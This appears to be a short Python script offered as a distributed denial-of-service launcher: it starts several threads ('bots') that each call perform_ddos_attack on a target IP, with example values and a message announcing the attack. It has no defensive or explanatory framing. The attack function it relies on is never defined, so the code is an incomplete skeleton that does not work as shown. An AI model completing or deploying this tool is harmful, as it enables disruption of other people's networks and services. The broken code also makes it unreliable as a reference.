import threading

def create_bot(target_ip, num_packets):
    def perform_attack():
        perform_ddos_attack(target_ip, num_packets)
    
    bot_thread = threading.Thread(target=perform_attack)
    bot_thread.start()

# Example usage
target_ip = "192.168.0.1"  # Replace with the target IP address
num_packets = 10000  # Number of packets to send per bot
num_bots = 5  # Number of bots to create

# Create a group of bots
for _ in range(num_bots):
    create_bot(target_ip, num_packets)

print("DDoS attack initiated with {} bots.".format(num_bots))